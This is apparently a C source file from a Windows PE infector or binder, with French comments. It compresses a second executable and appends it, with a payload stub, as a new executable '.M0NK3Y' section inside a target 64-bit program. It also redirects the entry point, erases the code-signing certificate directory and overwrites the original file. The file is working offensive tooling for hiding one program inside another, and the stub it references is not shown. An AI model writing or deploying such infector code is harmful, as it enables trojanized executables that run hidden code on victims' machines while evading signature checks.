#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>

#include <windows.h>

#include "payload.h"
#include "compress.h"
#include "utils.h"

#define ALIGN(x, alignement) ((x | (alignement-1)) + 1)

int inject_in_exe(char *exe, char *exe_to_inject) {

    uint8_t     *buf;
    size_t      buf_size;
    uint8_t     *raw_buf;
    size_t      raw_size;
    uint8_t     *buf_to_inject;
    size_t      buf_to_inject_size;
    size_t      payload_size;
    uint32_t    previous_entry = 0;
    int         check = 0;

    // on read l'exe dans lequel on inject
    buf = read_file(exe, &buf_size);
    if (buf == NULL)
        return -1;
    // on read et compress l'exe à injecter
    raw_buf = read_file(exe_to_inject, &raw_size);
    if (raw_buf == NULL)
        return free(buf), -1;
    buf_to_inject = compress_buf(raw_buf, raw_size, &buf_to_inject_size);
    if (buf_to_inject == NULL)
        return free(buf), free(raw_buf), -1;
    free(raw_buf);

    PIMAGE_DOS_HEADER dos     = (PIMAGE_DOS_HEADER)buf;
    PIMAGE_NT_HEADERS nt      = (PIMAGE_NT_HEADERS)(buf + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    size_t sec_nb             = nt->FileHeader.NumberOfSections;
    previous_entry            = nt->OptionalHeader.AddressOfEntryPoint;

    if (dos->e_magic != 0x5A4D || nt->Signature != 0x00004550) {
        printf("Bad executable, corrupted\n");
        return -1;
    }
    if (nt->OptionalHeader.Magic != 0x20b) {
        printf("Executable target is not 64bit\n");
        return -1;
    }
    
    // sizeofheaders aligné sur file aligne, verife si on a pas la place de rajouter une section
    if (nt->OptionalHeader.SizeOfHeaders - sizeof(IMAGE_DOS_HEADER)+sizeof(IMAGE_NT_HEADERS)+sizeof(IMAGE_SECTION_HEADER)*sec_nb < sizeof(IMAGE_SECTION_HEADER))
        return free(buf), free(buf_to_inject), -1;

    payload_size = ((uintptr_t)payload_end - (uintptr_t)payload_start) + buf_to_inject_size;

    // on creer la nouvel section
    IMAGE_SECTION_HEADER new_sec;

    memset(&new_sec, 0, sizeof(new_sec));

    new_sec.Name[0] = '.';
    new_sec.Name[1] = 'M';
    new_sec.Name[2] = '0';
    new_sec.Name[3] = 'N';
    new_sec.Name[4] = 'K';
    new_sec.Name[5] = '3';
    new_sec.Name[6] = 'Y';
    new_sec.Name[7] = 0;
    
    new_sec.Misc.VirtualSize     = ALIGN(payload_size, nt->OptionalHeader.FileAlignment);
    new_sec.VirtualAddress       = ALIGN((sec[sec_nb-1].VirtualAddress + sec[sec_nb-1].Misc.VirtualSize), nt->OptionalHeader.SectionAlignment); 
    new_sec.SizeOfRawData        = ALIGN(payload_size, nt->OptionalHeader.FileAlignment);;
    new_sec.PointerToRawData     = ALIGN((sec[sec_nb-1].PointerToRawData + sec[sec_nb-1].SizeOfRawData), nt->OptionalHeader.FileAlignment); 
    new_sec.PointerToRelocations = 0;
    new_sec.PointerToLinenumbers = 0;
    new_sec.NumberOfRelocations  = 0;
    new_sec.NumberOfLinenumbers  = 0;
    new_sec.Characteristics      = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

    // rajout de la section dans les headers
    memcpy(&sec[sec_nb], &new_sec, sizeof(new_sec));
    nt->FileHeader.NumberOfSections++;

    // fix les headers
    nt->OptionalHeader.SizeOfImage = ALIGN((new_sec.VirtualAddress + new_sec.Misc.VirtualSize), nt->OptionalHeader.SectionAlignment);
    // sizeofheaders devrait pas changer, on verifie avant que ça rentre
    //nt->OptionalHeader.SizeOfHeaders = ALIGN((nt->OptionalHeader.SizeOfHeaders + sizeof(IMAGE_SECTION_HEADER)), nt->OptionalHeader.FileAlignment);
    nt->OptionalHeader.SizeOfCode            += new_sec.Misc.VirtualSize;
    nt->OptionalHeader.SizeOfInitializedData += new_sec.Misc.VirtualSize;

    uint32_t old_ptrsymbole = 0;
    if (nt->FileHeader.PointerToSymbolTable) {
        old_ptrsymbole = nt->FileHeader.PointerToSymbolTable;
        nt->FileHeader.PointerToSymbolTable = ALIGN((new_sec.PointerToRawData + new_sec.SizeOfRawData), nt->OptionalHeader.FileAlignment); 
    }

    // on change le point d'entrée
    nt->OptionalHeader.AddressOfEntryPoint = new_sec.VirtualAddress;

    // on enleve les cerificats
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress &&
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size)
        memset(buf + find_rva(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress,sec, sec_nb),
               0, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size           = 0;

    size_t filesize = new_sec.PointerToRawData + new_sec.SizeOfRawData;
    if (nt->FileHeader.PointerToSymbolTable)
        filesize = nt->FileHeader.PointerToSymbolTable + buf_size-old_ptrsymbole;
    uint8_t *tmp = malloc(filesize);
    if (tmp == NULL)
        return free(buf), free(buf_to_inject), -1;
    memset(tmp, 0, filesize);

    // on recreer l'exe, on copie les sections
    memcpy(tmp, buf, nt->OptionalHeader.SizeOfHeaders);
    for (size_t i = 0; i < sec_nb; i++) {
        if (sec[i].PointerToRawData)
            memcpy(tmp+sec[i].PointerToRawData, buf+sec[i].PointerToRawData, sec[i].SizeOfRawData);
    }
    // on copie la nouvel sections
    memcpy(tmp + new_sec.PointerToRawData, (uint8_t *)payload_start, ((uintptr_t)payload_end - (uintptr_t)payload_start));
    if (nt->FileHeader.PointerToSymbolTable) {
        memcpy(tmp+nt->FileHeader.PointerToSymbolTable, buf+old_ptrsymbole, buf_size-old_ptrsymbole);
    }

    // on fix le payload
    for (size_t i = 0; i < payload_size; i++) {
        if (*(uint32_t *)&tmp[new_sec.PointerToRawData+i] == 0x26262626) {
            *(uint32_t *)&tmp[new_sec.PointerToRawData+i] = 0xFFFFFFFF - (new_sec.VirtualAddress+i+3 - previous_entry);
            check++;
        } else if (*(uint64_t *)&tmp[new_sec.PointerToRawData+i] == 0x8888888888888888) {
            memcpy(&tmp[new_sec.PointerToRawData+i], buf_to_inject, buf_to_inject_size);
            check++;
        } else if (*(uint64_t *)&tmp[new_sec.PointerToRawData+i] == 0x4545454545454545) {
            *(uint64_t *)&tmp[new_sec.PointerToRawData+i] = buf_to_inject_size;
            check++;
        }
    }
    if (check != 3)
        return free(tmp), free(buf), free(buf_to_inject), -1;

    // on recompute le checksum
    uint32_t checksum = pe_header_checksum((uint32_t *)tmp, filesize);
    nt->OptionalHeader.CheckSum = checksum;
    memcpy(tmp, buf, nt->OptionalHeader.SizeOfHeaders);

    // on flush
    FILE *outfp = fopen(exe, "wb");
    if (outfp == NULL)
        return -1;
    fwrite(tmp, 1, filesize, outfp);
    fclose(outfp);

    free(tmp);
    free(buf);
    free(buf_to_inject);

    return 0;
}
